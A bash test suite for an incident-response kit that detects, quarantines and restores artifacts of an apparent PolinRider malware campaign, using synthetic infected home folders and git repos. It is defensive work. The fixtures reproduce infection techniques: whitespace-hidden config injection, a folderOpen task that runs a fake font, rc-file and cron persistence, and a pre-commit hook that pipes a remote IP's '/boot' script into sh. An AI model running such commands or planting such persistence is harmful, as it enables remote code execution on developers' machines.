#!/usr/bin/env bash
# Tests for live-respond.sh and history-report.sh. Everything is HARMLESS and synthetic:
# "malicious" processes are copies of perl (symlinked as node / python3) that only sleep and
# carry a published marker string inside a comment, files are inert text, git repos are
# built in a temp folder, and the GitHub API is a local mock. Nothing real is contacted.
# shellcheck disable=SC2016,SC2009,SC2012
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd -P)"
ROOT="$(cd "${HERE}/.." && pwd -P)"
LIVE="${ROOT}/live-respond.sh"
HIST="${ROOT}/history-report.sh"
T="$(mktemp -d "${TMPDIR:-/tmp}/live-selftest.XXXXXX")"
PIDS=()
cleanup() {
  for p in "${PIDS[@]:-}"; do [[ -n "${p}" ]] && kill -9 "${p}" 2>/dev/null; done
  [[ -n "${KEEP:-}" ]] || rm -rf "${T}"
}
trap cleanup EXIT
pass=0 fail=0
ok()  { pass=$((pass+1)); printf 'PASS %s\n' "$1"; }
bad() { fail=$((fail+1)); printf 'FAIL %s\n' "$1"; }
check() { if eval "$2"; then ok "$1"; else bad "$1"; [[ -n "${3:-}" && -f "${3}" ]] && sed 's/^/    | /' "$3" | head -40; fi; }
alive() { kill -0 "$1" 2>/dev/null && [[ "$(ps -o stat= -p "$1" 2>/dev/null | tr -d ' ')" != Z* ]]; }
gone() { local _; for _ in 1 2 3 4 5 6 7 8 9 10; do alive "$1" || return 0; sleep 0.3; done; return 1; }
# wait until a pid shows up with its full command line in the process table
visible() { local _; for _ in $(seq 1 30); do ps -axww -o pid=,command= 2>/dev/null | grep -q "^ *$1 " && return 0; sleep 0.1; done; return 1; }

BIN="${T}/bin"; mkdir -p "${BIN}"
PERL="$(command -v perl)"
ln -s "${PERL}" "${BIN}/node"
REALPY="$(command -v python3)"
ln -s "${PERL}" "${BIN}/python3"
# Common live-respond arguments: only look at the fake home, never at the real machine.
FH="${T}/home"
LR=("${LIVE}" --isolated --home "${FH}" --no-history --quarantine-root "${T}/q")

# ================================================================ 1. benign processes are not flagged
mkdir -p "${T}/proj/node_modules/.bin"
printf 'sleep 300;\n' > "${T}/proj/node_modules/.bin/next"
printf 'sleep 300;\n' > "${T}/proj/webpack.config.js"
mkdir -p "${FH}"
"${BIN}/node" -e 'sleep 300; # console.log("hello from a normal one-liner")' & B1=$!; PIDS+=("${B1}"); disown "${B1}"
"${BIN}/node" "${T}/proj/node_modules/.bin/next" dev & B2=$!; PIDS+=("${B2}"); disown "${B2}"
"${BIN}/node" -e 'sleep 300; # fetch("https://ethereum-rpc.publicnode.com", {method:"POST"}) // a web3 balance check, no eval' & B3=$!; PIDS+=("${B3}"); disown "${B3}"
"${BIN}/node" "${T}/proj/webpack.config.js" --mode production & B4=$!; PIDS+=("${B4}"); disown "${B4}"
"${BIN}/python3" -e 'sleep 300; # python -m http.server style helper' & B5=$!; PIDS+=("${B5}"); disown "${B5}"
for p in "${B1}" "${B2}" "${B3}" "${B4}" "${B5}"; do visible "${p}"; done
"${LR[@]}" > "${T}/benign.out" 2>&1; rc=$?
check "benign dev processes: verdict SAFE, exit 0" "[[ ${rc} -eq 0 ]] && grep -q 'SAFE TO ROTATE CREDENTIALS' '${T}/benign.out'" "${T}/benign.out"
check "benign dev processes: none reported" "! grep -qE 'pid (${B1}|${B2}|${B3}|${B4}|${B5})\b' '${T}/benign.out' && grep -q 'none matched' '${T}/benign.out'" "${T}/benign.out"
check "benign dev processes: still running after --kill" "'${LR[0]}' --isolated --home '${FH}' --no-history --kill >/dev/null 2>&1; alive ${B1} && alive ${B2} && alive ${B3} && alive ${B4} && alive ${B5}"
for p in "${B1}" "${B2}" "${B3}" "${B4}" "${B5}"; do kill -9 "${p}" 2>/dev/null; done

# ================================================================ 2. detection, report only, --kill
"${BIN}/node" -e "sleep 300; # global.i='A9-1403-4';" & M1=$!; PIDS+=("${M1}"); disown "${M1}"
"${BIN}/node" -e 'sleep 300; # fetch("https://ethereum-rpc.publicnode.com"); eval(body); http://10.9.8.7:1234/boot' & M2=$!; PIDS+=("${M2}"); disown "${M2}"
"${BIN}/python3" -e 'sleep 300; # tmp7A863DD1 lock file of the stealer stage' & M3=$!; PIDS+=("${M3}"); disown "${M3}"
cat > "${T}/temp_auto_push.sh" <<'SH'
#!/usr/bin/env bash
sleep 300 &
echo $! > "$1"
wait
SH
bash "${T}/temp_auto_push.sh" "${T}/child.pid" & M4=$!; PIDS+=("${M4}"); disown "${M4}"
for p in "${M1}" "${M2}" "${M3}" "${M4}"; do visible "${p}"; done
for _ in $(seq 1 30); do [[ -s "${T}/child.pid" ]] && break; sleep 0.1; done
CHILD="$(cat "${T}/child.pid")"; PIDS+=("${CHILD}")
"${LR[@]}" > "${T}/mal.out" 2>&1; rc=$?
check "malicious processes: exit 2 and NOT SAFE YET" "[[ ${rc} -eq 2 ]] && grep -q 'NOT SAFE YET' '${T}/mal.out' && ! grep -q 'SAFE TO ROTATE' '${T}/mal.out'" "${T}/mal.out"
check "node -e with global.i marker detected (pid, parent shown)" "grep -qE 'HIGH +pid ${M1} +parent' '${T}/mal.out'" "${T}/mal.out"
check "node -e with RPC lookup + eval + /boot detected" "grep -qE 'HIGH +pid ${M2} ' '${T}/mal.out'"
check "python stealer lock-file process detected" "grep -qE 'HIGH +pid ${M3} ' '${T}/mal.out'"
check "temp_auto_push script process detected" "grep -qE 'HIGH +pid ${M4} ' '${T}/mal.out'"
check "report-only mode leaves every process running" "alive ${M1} && alive ${M2} && alive ${M3} && alive ${M4} && alive ${CHILD}"
"${LR[@]}" --kill > "${T}/kill.out" 2>&1; rc=$?
check "--kill stops matched processes" "gone ${M1} && gone ${M2} && gone ${M3} && gone ${M4}" "${T}/kill.out"
check "--kill also stops the child of the auto-push script" "gone ${CHILD}"
check "after --kill: verdict SAFE, exit 0" "[[ ${rc} -eq 0 ]] && grep -q 'SAFE TO ROTATE CREDENTIALS' '${T}/kill.out'" "${T}/kill.out"
check "rotation checklist is printed" "grep -q 'Rotation checklist' '${T}/kill.out' && grep -q 'reinstall the operating system' '${T}/kill.out' && grep -q 'cannot undo' '${T}/kill.out'"
check "the live-respond process was never in its own report" "! grep -q 'live-core.pl' '${T}/mal.out'"

# ================================================================ 3. persistence: benign home is clean
mkdir -p "${FH}/.node_modules/node_modules/lodash" "${FH}/work/clean/.vscode" "${FH}/hooks"
printf 'export PATH="$HOME/.node_modules/bin:$PATH"\nalias ll="ls -l"\n' > "${FH}/.bashrc"
printf '{ "name": "clean", "private": true }\n' > "${FH}/work/clean/package.json"
printf 'export default { plugins: { tailwindcss: {} } };\n' > "${FH}/work/clean/postcss.config.mjs"
printf '{ "version": "2.0.0", "tasks": [ { "label": "watch", "type": "shell", "command": "npm run watch", "runOptions": { "runOn": "folderOpen" } }, { "label": "build", "type": "shell", "command": "npm run build" } ] }\n' > "${FH}/work/clean/.vscode/tasks.json"
mkdir -p "${FH}/.polinrider-guard"; cp -R "${ROOT}/hooks" "${FH}/.polinrider-guard/hooks"   # an installed copy of this kit's own hooks
printf '[core]\n\thooksPath = %s/.polinrider-guard/hooks\n' "${FH}" > "${FH}/.gitconfig"
"${LR[@]}" > "${T}/pclean.out" 2>&1; rc=$?
check "benign tasks.json, rc file, own hooks: no HIGH items" "! grep -qE '^ +HIGH ' '${T}/pclean.out'" "${T}/pclean.out"
check "unknown ~/.node_modules (no axios/socket.io) is REVIEW, blocks verdict" "grep -qE 'REVIEW +${FH}/.node_modules' '${T}/pclean.out' && [[ ${rc} -eq 2 ]]"
"${LR[@]}" --quarantine > "${T}/pclean2.out" 2>&1
check "--quarantine never moves REVIEW items" "[[ -d '${FH}/.node_modules/node_modules/lodash' ]] && [[ ! -d '${T}/q' ]]" "${T}/pclean2.out"
"${LR[@]}" --accept "${FH}/.node_modules" > "${T}/pclean3.out" 2>&1; rc=$?
check "--accept clears a REVIEW item: verdict SAFE" "[[ ${rc} -eq 0 ]] && grep -q 'accepted by you' '${T}/pclean3.out' && grep -q 'SAFE TO ROTATE' '${T}/pclean3.out'" "${T}/pclean3.out"
check "benign pass leaves the review folder untouched" "[[ -d '${FH}/.node_modules/node_modules/lodash' ]]"
rm -rf "${FH}/.node_modules"

# the kit never reports or moves its own files, nor those of a second copy of it
cp -R "${ROOT}" "${T}/kitcopy"; rm -rf "${T}/kitcopy/.git"
"${LR[@]}" --scan-dir "${ROOT}" --scan-dir "${T}/kitcopy" --quarantine --quarantine-root "${T}/qkit" > "${T}/kit.out" 2>&1; rc=$?
check "kit's own files and a second copy of the kit are never flagged or moved" "[[ ${rc} -eq 0 && ! -d '${T}/qkit' && -f '${ROOT}/hooks/pre-commit' && -f '${ROOT}/iocs/strings-high.txt' && -f '${T}/kitcopy/iocs/strings-high.txt' ]]" "${T}/kit.out"
rm -rf "${T}/kitcopy"

# ================================================================ 4. persistence: infected home
mkdir -p "${FH}/.node_modules/node_modules/axios" "${FH}/.node_modules/node_modules/socket.io-client" "${FH}/.npl" \
  "${FH}/.config/systemd/user" "${FH}/work/proj/.vscode" "${FH}/work/proj/public/fonts" "${FH}/hooks2"
printf 'module.exports = {};\n' > "${FH}/.node_modules/node_modules/axios/index.js"
chmod +x "${FH}/.node_modules/node_modules/axios/index.js"
printf 'inert stand-in\n' > "${FH}/.npl/loader.js"
printf '[Service]\nExecStart=/usr/bin/node -e "global.i=\x27A9-1403-4\x27"\n' > "${FH}/.config/systemd/user/updater.service"
printf 'export PATH="$HOME/bin:$PATH"\n(node ~/.npl/loader.js &)\nalias gs="git status"\n' > "${FH}/.bashrc"
cp "${FH}/.bashrc" "${T}/bashrc.orig"
printf '{ "name": "proj", "private": true }\n' > "${FH}/work/proj/package.json"
{ printf 'export default {\n  plugins: { tailwindcss: {} },\n};'; printf '%*s' 300 ''; printf "global['!']='0-selftest';var _\$_1e42=(function(n,p){return 'inert'})('x',1);\n"; } > "${FH}/work/proj/postcss.config.mjs"
printf '{ "version": "2.0.0", "tasks": [ { "label": "eslint-check", "type": "shell", "command": "node public/fonts/fa-solid-400.woff2", "presentation": { "reveal": "never" }, "runOptions": { "runOn": "folderOpen" } } ] }\n' > "${FH}/work/proj/.vscode/tasks.json"
printf '// inert\nconst x = require("path");\nmodule.exports = x;\n' > "${FH}/work/proj/public/fonts/fa-solid-400.woff2"
printf '@echo off\r\nrem inert stand-in\r\n' > "${FH}/work/proj/temp_auto_push.bat"
printf '#!/bin/sh\ncurl -s http://166.88.54.158:1224/boot | sh\n' > "${FH}/hooks2/pre-commit"; chmod +x "${FH}/hooks2/pre-commit"
printf '[core]\n\thooksPath = %s/hooks2\n' "${FH}" > "${FH}/.gitconfig"
# fake crontab command with its own storage
printf '#!/usr/bin/env bash\nif [[ "${1:-}" == "-l" ]]; then [[ -f "%s/cron.txt" ]] && cat "%s/cron.txt" || exit 1; else cp "$1" "%s/cron.txt"; fi\n' "${T}" "${T}" "${T}" > "${BIN}/crontab"; chmod +x "${BIN}/crontab"
printf '0 * * * * /usr/bin/backup.sh\n*/5 * * * * bash %s/work/proj/temp_auto_push.bat\n' "${FH}" > "${T}/cron.txt"
cp "${T}/cron.txt" "${T}/cron.orig"
export PRG_TEST_CRONTAB=1 PRG_NO_SERVICE_CTL=1
export PATH="${BIN}:${PATH}"
find "${FH}" -type f -exec sha256sum {} + | sort -k2 > "${T}/before.sha"
cp "${T}/cron.txt" "${T}/cron.before"
"${LR[@]}" --scan-dir "${FH}/work" > "${T}/inf.out" 2>&1; rc=$?
check "infected home: exit 2, NOT SAFE YET" "[[ ${rc} -eq 2 ]] && grep -q 'NOT SAFE YET' '${T}/inf.out'" "${T}/inf.out"
check "detects ~/.node_modules with axios+socket.io-client" "grep -qE 'HIGH +${FH}/.node_modules' '${T}/inf.out'"
check "detects ~/.npl artifact" "grep -qE 'HIGH +${FH}/.npl' '${T}/inf.out'"
check "detects systemd user unit running the loader" "grep -qE 'HIGH +${FH}/.config/systemd/user/updater.service' '${T}/inf.out'"
check "detects injected line in .bashrc" "grep -qE 'HIGH +${FH}/.bashrc' '${T}/inf.out'"
check "detects cron entry referencing temp_auto_push" "grep -qE 'HIGH +crontab' '${T}/inf.out'"
check "detects PolinRider-injected postcss.config.mjs" "grep -qE 'HIGH +${FH}/work/proj/postcss.config.mjs' '${T}/inf.out'"
check "detects folderOpen tasks.json that runs a fake font" "grep -qE 'HIGH +${FH}/work/proj/.vscode/tasks.json' '${T}/inf.out'"
check "detects fake font and temp_auto_push.bat" "grep -qE 'HIGH +${FH}/work/proj/public/fonts/fa-solid-400.woff2' '${T}/inf.out' && grep -qE 'HIGH +${FH}/work/proj/temp_auto_push.bat' '${T}/inf.out'"
check "detects malicious global git hook (core.hooksPath)" "grep -qE 'HIGH +${FH}/hooks2/pre-commit' '${T}/inf.out'"
check "benign neighbours are not flagged (clean project, benign rc lines)" "! grep -q '${FH}/work/clean' '${T}/inf.out'"
find "${FH}" -type f -exec sha256sum {} + | sort -k2 > "${T}/after_report.sha"
check "report-only changed no file and no crontab" "diff -q '${T}/before.sha' '${T}/after_report.sha' >/dev/null && diff -q '${T}/cron.before' '${T}/cron.txt' >/dev/null && [[ ! -d '${T}/q' ]]"

# ---- quarantine
"${LR[@]}" --scan-dir "${FH}/work" --quarantine > "${T}/quar.out" 2>&1; rc=$?
QD="$(ls -d "${T}"/q/*/ 2>/dev/null | head -1)"; QD="${QD%/}"
check "--quarantine creates a timestamped folder with manifest.json" "[[ -n '${QD}' && -f '${QD}/manifest.json' ]]" "${T}/quar.out"
check "--quarantine: infected files are moved away from their places" "[[ ! -e '${FH}/.npl' && ! -e '${FH}/.node_modules' && ! -e '${FH}/work/proj/postcss.config.mjs' && ! -e '${FH}/work/proj/.vscode/tasks.json' && ! -e '${FH}/work/proj/temp_auto_push.bat' && ! -e '${FH}/.config/systemd/user/updater.service' && ! -e '${FH}/hooks2/pre-commit' ]]"
check "--quarantine: nothing was deleted (files exist under the quarantine folder)" "[[ -f '${QD}/items/0001/.npl/loader.js' || -n \"\$(find '${QD}/items' -name loader.js)\" ]] && [[ -n \"\$(find '${QD}/items' -name postcss.config.mjs)\" ]]"
check "--quarantine: rc file keeps its benign lines, bad line commented out" "grep -q 'alias gs=' '${FH}/.bashrc' && grep -q '# polinrider-guard disabled: (node' '${FH}/.bashrc' && ! grep -qE '^\(node' '${FH}/.bashrc'"
check "--quarantine: cron keeps the backup job, auto-push job disabled" "grep -q 'backup.sh' '${T}/cron.txt' && grep -q '# polinrider-guard disabled' '${T}/cron.txt' && ! grep -qE '^[^#].*temp_auto_push' '${T}/cron.txt'"
check "--quarantine: untouched files stay (clean project)" "[[ -f '${FH}/work/clean/postcss.config.mjs' ]]"
check "manifest has original path, quarantine path and sha256 for each moved item" "'${REALPY}' - '${QD}/manifest.json' <<'PY'
import json, sys, hashlib, os
m = json.load(open(sys.argv[1]))
moves = [e for e in m['entries'] if e['type'] == 'move']
assert len(moves) >= 7, len(moves)
for e in moves:
    assert e['original'].startswith('/') and os.path.exists(e['quarantined']), e
    if e['type'] == 'move' and 'sha256' in e:
        h = hashlib.sha256(open(e['quarantined'], 'rb').read()).hexdigest()
        assert h == e['sha256'], e
    else:
        assert e['files'], e
        for f in e['files']:
            if f.get('sha256'):
                assert hashlib.sha256(open(os.path.join(e['quarantined'], f['rel']), 'rb').read()).hexdigest() == f['sha256'], f
assert any(e['type'] == 'edit' for e in m['entries']) and any(e['type'] == 'crontab' for e in m['entries'])
PY"
check "quarantined files lose their execute bit" "[[ -z \"\$(find '${QD}/items' -type f -perm /111 2>/dev/null)\" ]]"
check "after --quarantine: verdict SAFE, exit 0" "[[ ${rc} -eq 0 ]] && grep -q 'SAFE TO ROTATE CREDENTIALS' '${T}/quar.out'" "${T}/quar.out"
check "quarantine output names the restore command" "grep -q -- '--restore' '${T}/quar.out'"

# ---- restore
"${LIVE}" --restore "${QD}" > "${T}/rest0.out" 2>&1; rc=$?
check "--restore without --yes refuses and restores nothing" "[[ ${rc} -eq 3 && ! -e '${FH}/.npl' ]]"
"${LIVE}" --restore "${QD}" --yes > "${T}/rest.out" 2>&1; rc=$?
check "--restore --yes puts everything back (exit 0)" "[[ ${rc} -eq 0 && -f '${FH}/.npl/loader.js' && -f '${FH}/work/proj/postcss.config.mjs' && -f '${FH}/hooks2/pre-commit' && -f '${FH}/.config/systemd/user/updater.service' ]]" "${T}/rest.out"
find "${FH}" -type f -exec sha256sum {} + | sort -k2 > "${T}/after_restore.sha"
check "restored files are byte-identical to the originals" "diff -q '${T}/before.sha' '${T}/after_restore.sha' >/dev/null"
check "restored crontab equals the original" "diff -q '${T}/cron.orig' '${T}/cron.txt' >/dev/null"
check "restore brings back the execute bit" "[[ -x '${FH}/hooks2/pre-commit' ]]"
"${LR[@]}" --scan-dir "${FH}/work" > "${T}/again.out" 2>&1; rc=$?
check "after restore the tool flags the machine again" "[[ ${rc} -eq 2 ]]"
"${LIVE}" --restore "${QD}" --yes > "${T}/rest2.out" 2>&1
find "${FH}" -type f -exec sha256sum {} + | sort -k2 > "${T}/after_restore2.sha"
check "restoring twice overwrites nothing and loses nothing" "grep -q 'not in quarantine any more' '${T}/rest2.out' && diff -q '${T}/before.sha' '${T}/after_restore2.sha' >/dev/null"

# ================================================================ 5. --watch
rm -rf "${T}/q2"
env -u PRG_TEST_CRONTAB "${LIVE}" --isolated --home "${T}/emptyhome" --no-history --no-repos --watch --interval 1 --max-cycles 7 --kill --quarantine-root "${T}/q2" > "${T}/watch.out" 2>&1 &
W=$!; PIDS+=("${W}")
sleep 3
"${BIN}/node" -e "sleep 300; # global.i='A9-1403-4' (reappears while the user rotates tokens)" & W1=$!; PIDS+=("${W1}"); disown "${W1}"
wait "${W}"; rc=$?
check "--watch alerts when a loader reappears" "grep -q 'ALERT' '${T}/watch.out' && grep -qE 'pid ${W1} ' '${T}/watch.out'" "${T}/watch.out"
check "--watch --kill stops the reappearing process" "gone ${W1}"
check "--watch ends with a verdict (SAFE, exit 0)" "[[ ${rc} -eq 0 ]] && grep -q 'SAFE TO ROTATE CREDENTIALS' '${T}/watch.out'"

# ================================================================ 6. history report
mkdir -p "${T}/repos"
gc() { git -c user.name=Victim -c user.email=victim@example.invalid -c commit.gpgsign=false -c core.hooksPath=/dev/null "$@"; }
mkrepo() { local d="$1"; mkdir -p "${d}"; git -C "${d}" init -q -b main; }
commit() {  # commit DIR MSG AUTHOR_DATE COMMITTER_DATE
  GIT_AUTHOR_DATE="$3" GIT_COMMITTER_DATE="$4" gc -C "$1" add -A >/dev/null; GIT_AUTHOR_DATE="$3" GIT_COMMITTER_DATE="$4" gc -C "$1" commit -q -m "$2" --allow-empty
}
INERT() { { printf 'export default {\n  plugins: { tailwindcss: {} },\n};'; printf '%*s' 300 ''; printf "global.i='A9-1403-4';var _\$_1e42=(function(n,p){return 'inert'})('x',1);\n"; }; }
A="${T}/repos/a-history-only"; mkrepo "${A}"
printf 'export default { plugins: {} };\n' > "${A}/postcss.config.mjs"; echo 1 > "${A}/a.txt"
commit "${A}" "initial" "2026-01-01T10:00:00+0000" "2026-01-01T10:00:00+0000"
echo 2 >> "${A}/a.txt"; commit "${A}" "second" "2026-02-01T10:00:00+0000" "2026-02-01T10:00:00+0000"
INERT > "${A}/postcss.config.mjs"
commit "${A}" "tweak styles" "2025-06-01T09:00:00+0000" "2026-03-01T12:00:00+0000"   # backdated author date
echo 3 >> "${A}/a.txt"; commit "${A}" "fourth" "2026-03-05T10:00:00+0000" "2026-03-05T10:00:00+0000"
printf 'export default { plugins: {} };\n' > "${A}/postcss.config.mjs"
commit "${A}" "clean up" "2026-03-10T10:00:00+0000" "2026-03-10T10:00:00+0000"
SHA3="$(git -C "${A}" log --format=%H --grep='tweak styles')"
B2="${T}/repos/b-infected-head"; mkrepo "${B2}"
echo 1 > "${B2}/x.txt"; commit "${B2}" "init" "2026-04-01T10:00:00+0000" "2026-04-01T10:00:00+0000"
INERT > "${B2}/postcss.config.mjs"; commit "${B2}" "add config" "2026-04-02T10:00:00+0000" "2026-04-02T10:00:00+0000"
SHAB="$(git -C "${B2}" rev-parse HEAD)"
C2="${T}/repos/c-clean"; mkrepo "${C2}"; echo ok > "${C2}/ok.txt"; commit "${C2}" "init" "2026-04-01T10:00:00+0000" "2026-04-01T10:00:00+0000"
D2="${T}/repos/d-branch-only"; mkrepo "${D2}"
echo 1 > "${D2}/x.txt"; commit "${D2}" "init" "2026-05-01T10:00:00+0000" "2026-05-01T10:00:00+0000"
gc -C "${D2}" checkout -q -b feature; INERT > "${D2}/tailwind.config.js"; commit "${D2}" "feature work" "2026-05-02T10:00:00+0000" "2026-05-02T10:00:00+0000"
gc -C "${D2}" checkout -q main
"${HIST}" --json "${T}/hist.json" "${T}/repos" > "${T}/hist.out" 2>&1; rc=$?
check "history: exit 2 when some repo is infected now" "[[ ${rc} -eq 2 ]]" "${T}/hist.out"
check "history: first infected commit found in the middle of history" "grep -A3 'First commit with infected code' '${T}/hist.out' | grep -q '${SHA3}'" "${T}/hist.out"
check "history: author date is the backdated one, committer date also shown" "grep -q 'authored  2025-06-01T09:00:00' '${T}/hist.out' && grep -q 'committed 2026-03-01T12:00:00' '${T}/hist.out'"
check "history: date mismatch flagged (committer after author, before parent)" "grep -q 'committer date is .* days after the author date' '${T}/hist.out' && grep -q 'BEFORE its own parent' '${T}/hist.out'"
check "history: files and author named" "grep -q 'files     postcss.config.mjs' '${T}/hist.out' && grep -q 'Victim <victim@example.invalid>' '${T}/hist.out'"
check "history: repo cleaned later is HISTORY ONLY and HEAD is clean" "awk '/Repo .*a-history-only/{f=1} f&&/status:/{print; exit}' '${T}/hist.out' | grep -q 'HISTORY ONLY' && awk '/Repo .*a-history-only/{f=1} f&&/HEAD:/{print; exit}' '${T}/hist.out' | grep -q 'HEAD: no'"
check "history: repo infected at HEAD detected with since-date" "awk '/Repo .*b-infected-head/{f=1} f&&/HEAD:/{print; exit}' '${T}/hist.out' | grep -q 'HEAD: .*YES' && grep -q '${SHAB:0:10}' '${T}/hist.out'"
check "history: infection on a branch only is found and HEAD (main) is clean" "awk '/Repo .*d-branch-only/{f=1} f&&/HEAD:/{print; exit}' '${T}/hist.out' | grep -q 'HEAD: no' && awk '/Repo .*d-branch-only/{f=1} f&&/refs carrying it/{print; exit}' '${T}/hist.out' | grep -q 'feature'"
check "history: clean repo reports clean" "awk '/Repo .*c-clean/{f=1} f&&/status:/{print; exit}' '${T}/hist.out' | grep -q 'CLEAN'"
check "history: summary counts (2 infected now, 1 history only, 1 clean)" "grep -q 'repositories scanned: 4   infected now: 2 (HEAD: 1)   history only: 1   clean: 1' '${T}/hist.out'" "${T}/hist.out"
check "history: summary lists infected-since dates" "awk '/^Summary/{f=1} f' '${T}/hist.out' | grep -q 'since 2025-06-01T09:00:00'"
check "history: JSON report is valid and has the first commit" "${REALPY} -c \"import json; j=json.load(open('${T}/hist.json')); r=[x for x in j['repos'] if x['path'].endswith('a-history-only')][0]; assert r['first']['sha']=='${SHA3}' and r['status'].startswith('HISTORY')\""
"${HIST}" "${C2}" > "${T}/hist_clean.out" 2>&1; rc=$?
check "history: clean repo exits 0" "[[ ${rc} -eq 0 ]]"
"${HIST}" "${A}" > "${T}/hist_a.out" 2>&1; rc=$?
check "history: history-only repo exits 1" "[[ ${rc} -eq 1 ]]"
"${HIST}" "${ROOT}" > "${T}/hist_self.out" 2>&1; rc=$?
check "history: this kit's own repo (IOC lists, tests) is not reported as infected" "[[ ${rc} -eq 0 ]]" "${T}/hist_self.out"
# full run also prints the history report
"${LIVE}" --isolated --home "${FH}" --quarantine-root "${T}/q3" --scan-dir "${T}/repos/b-infected-head" > "${T}/full.out" 2>&1
check "full live run ends with the git history report" "grep -q 'Git history report' '${T}/full.out' && grep -q 'First commit with infected code' '${T}/full.out'" "${T}/full.out"

# ================================================================ 7. GitHub forks and code search (mock API)
"${REALPY}" "${HERE}/mock-github.py" "${T}/port.txt" > /dev/null 2>&1 & MOCK=$!; PIDS+=("${MOCK}"); disown "${MOCK}"
for _ in $(seq 1 50); do [[ -s "${T}/port.txt" ]] && break; sleep 0.1; done
PORT="$(cat "${T}/port.txt")"
export POLINRIDER_GITHUB_API="http://127.0.0.1:${PORT}" POLINRIDER_GITHUB_RAW="http://127.0.0.1:${PORT}/raw"
env -u GITHUB_TOKEN "${HIST}" --github owner/repo --max-forks 100 "${C2}" > "${T}/gh.out" 2>&1; rc=$?
check "github: lists forks and flags the two infected ones (config and tailwind)" "grep -q 'forks listed: 3 (limit 100), checked: 3, not checked: 0' '${T}/gh.out' && grep -q 'default branch carries the pattern: 2' '${T}/gh.out' && grep -q 'https://github.com/f1/repo' '${T}/gh.out' && grep -q 'https://github.com/f3/repo' '${T}/gh.out' && ! grep -q 'https://github.com/f2/repo' '${T}/gh.out'" "${T}/gh.out"
check "github: clean fork counted clean, parent repo checked" "grep -q 'forks whose default branch shows no known pattern: 1' '${T}/gh.out' && grep -q 'owner/repo default branch: no known pattern' '${T}/gh.out'"
check "github: unauthenticated run skips code search and says why" "grep -q 'code search needs authentication' '${T}/gh.out'"
check "github: limits are stated (private repos, clones, no user counts)" "grep -q 'Private repositories, plain clones' '${T}/gh.out' && grep -q 'never as a count of victims' '${T}/gh.out'"
rm -f "${T}/port.txt.log"
GITHUB_TOKEN="fake-token-for-mock" "${HIST}" --github owner/repo --max-forks 2 --fingerprint 'rmcej%otb%' "${C2}" > "${T}/gh2.out" 2>&1
check "github: --max-forks bounds the number of forks checked" "grep -q 'forks listed: 2 (limit 2), checked: 2' '${T}/gh2.out' && ! grep -q 'f3/repo' '${T}/gh2.out'" "${T}/gh2.out"
check "github: with a token, code search reports counts and sample URLs" "grep -q 'file match(es) reported by GitHub' '${T}/gh2.out' && grep -q 'https://github.com/someone/else/blob/main/postcss.config.mjs' '${T}/gh2.out'" "${T}/gh2.out"
check "github: the token is sent to the API but never printed" "grep -q 'auth=yes' '${T}/port.txt.log' && ! grep -rq 'fake-token-for-mock' '${T}/gh2.out'"
kill "${MOCK}" 2>/dev/null; rm -f "${T}/port.txt"
"${REALPY}" "${HERE}/mock-github.py" "${T}/port.txt" 5 > /dev/null 2>&1 & MOCK2=$!; PIDS+=("${MOCK2}"); disown "${MOCK2}"
for _ in $(seq 1 50); do [[ -s "${T}/port.txt" ]] && break; sleep 0.1; done
PORT="$(cat "${T}/port.txt")"
export POLINRIDER_GITHUB_API="http://127.0.0.1:${PORT}" POLINRIDER_GITHUB_RAW="http://127.0.0.1:${PORT}/raw"
env -u GITHUB_TOKEN "${HIST}" --github owner/repo --no-code-search "${C2}" > "${T}/gh3.out" 2>&1
check "github: stops early and says so when the rate limit is nearly used up" "grep -q 'stopped early' '${T}/gh3.out' && grep -q 'not checked: [1-9]' '${T}/gh3.out'" "${T}/gh3.out"
unset POLINRIDER_GITHUB_API POLINRIDER_GITHUB_RAW

echo "----"; echo "passed=${pass} failed=${fail}"
[[ ${fail} -eq 0 ]]
